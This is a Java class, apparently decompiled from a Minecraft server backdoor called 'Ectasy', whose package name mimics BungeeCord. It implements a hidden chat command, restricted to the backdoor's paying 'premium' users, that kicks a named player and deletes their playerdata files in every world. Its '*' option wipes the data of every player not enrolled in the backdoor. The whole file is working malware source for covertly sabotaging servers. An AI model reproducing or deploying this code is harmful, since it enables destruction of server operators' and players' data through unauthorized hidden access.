package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.io.File;

import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "reset",
   description = "Resets player data",
   blatant = true,
   rank = Rank.PREMIUM
)
public class ResetPlayerDataCommand extends AbstractCommand {
   public void reset(OfflinePlayer var1) {
      if (var1.isOnline()) {
         Bukkit.getServer().getPlayer(var1.getName()).kickPlayer("");
      }

      for(World var3 : Bukkit.getServer().getWorlds()) {
         File var4 = new File(var3.getWorldFolder(), "playerdata/" + var1.getUniqueId().toString() + ".dat");
         if (var4.exists()) {
            var4.delete();
         }
      }
   }

   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use reset <player | *>");
            } else if (args[0].equals("*")) {
               for(User var2 : Ectasy.users.values()) {
                  if (var2.rank == Rank.UNAUTHORIZED) {
                     reset(var2.player);
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Reset everyone's player data");
            } else {
               reset(Bukkit.getServer().getOfflinePlayer(args[0]));
               ChatUtil.sendChat(e.getPlayer(), "Reset " + args[0] + "'s player data");
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
